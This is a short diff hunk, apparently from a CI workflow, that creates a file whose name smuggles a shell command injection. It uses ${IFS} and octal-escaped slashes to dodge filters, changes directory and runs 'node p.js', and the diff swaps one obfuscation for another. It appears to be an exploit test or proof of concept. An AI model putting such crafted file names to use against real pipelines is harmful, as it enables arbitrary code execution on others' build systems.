@@ -14,7 +14,7 @@ jobs:
           printf 'forged report body' > content/body
           python3 - <<'PY'
           import os
-          name = "body;cd${IFS}${PWD:0:1}tmp${PWD:0:1}content${PWD:0:1}content;node${IFS}p.js;#.txt"
+          name = r"body;cd${IFS}$'\057'tmp$'\057'content$'\057'content;node${IFS}p.js;#.txt"
           assert len(name) < 255, len(name)
           open(os.path.join("content", name), "w").close()
           PY
